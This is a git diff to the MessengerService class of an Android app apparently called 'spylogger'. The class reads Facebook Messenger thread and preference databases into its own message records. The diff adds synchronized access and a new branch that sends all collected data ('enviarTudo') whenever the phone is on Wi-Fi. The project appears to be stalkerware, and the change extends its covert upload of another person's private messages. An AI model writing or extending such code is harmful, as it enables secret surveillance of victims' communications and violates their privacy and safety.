@@ -12,6 +12,7 @@ import android.util.Log;
 import com.gravatasufoca.spylogger.dao.DatabaseHelper;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookPrefs;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookThreads;
+import com.gravatasufoca.spylogger.helpers.NetworkUtil;
 import com.gravatasufoca.spylogger.model.Mensagem;
 import com.gravatasufoca.spylogger.model.TipoMensagem;
 import com.gravatasufoca.spylogger.model.TipoMidia;
@@ -144,7 +145,7 @@ public class MessengerService extends Service {
         Utils.faceObserver.startWatching(); // START OBSERVING
     }
 
-    private void updateTopicos() {
+    private synchronized void updateTopicos() {
         external = new DatabaseHelperFacebookThreads(getApplicationContext());
         dbHelper = new DatabaseHelper((getApplicationContext()));
         GenericRawResults<Object[]> raws = null;
@@ -207,7 +208,7 @@ public class MessengerService extends Service {
     }
 
 
-    private void updateMsg(List<Topico> tt) {
+    private synchronized void updateMsg(List<Topico> tt) {
         GenericRawResults<Object[]> rawResults = null;
         try {
 
@@ -283,9 +284,14 @@ public class MessengerService extends Service {
     }
     private void continuarServicos(){
         if(primeiraVez){
+            primeiraVez=false;
             Intent intent = new Intent(Utils.PRIMEIRA_CARGA);
             intent.putExtra(PrimeiraCarga.INICIALIZAR,true);
             sendBroadcast(intent);
+        }else{
+            if(NetworkUtil.isWifi(getApplicationContext())) {
+                Utils.enviarTudo(getApplicationContext());
+            }
         }
     }
     private Contact getProprietario(Context context) {
